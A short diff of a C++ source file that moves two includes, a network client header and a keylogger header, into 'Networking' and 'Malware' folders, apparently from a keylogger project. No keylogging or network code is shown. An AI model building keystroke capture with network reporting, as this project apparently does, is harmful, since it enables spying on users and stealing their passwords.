@@ -1,5 +1,5 @@
-#include"../lib/ClientNetwork.hpp"
-#include "../lib/Keylogger.hpp"
+#include"../lib/Networking/ClientNetwork.hpp"
+#include "../lib/Malware/Keylogger.hpp"
 #include <iostream>
 
 int main() {
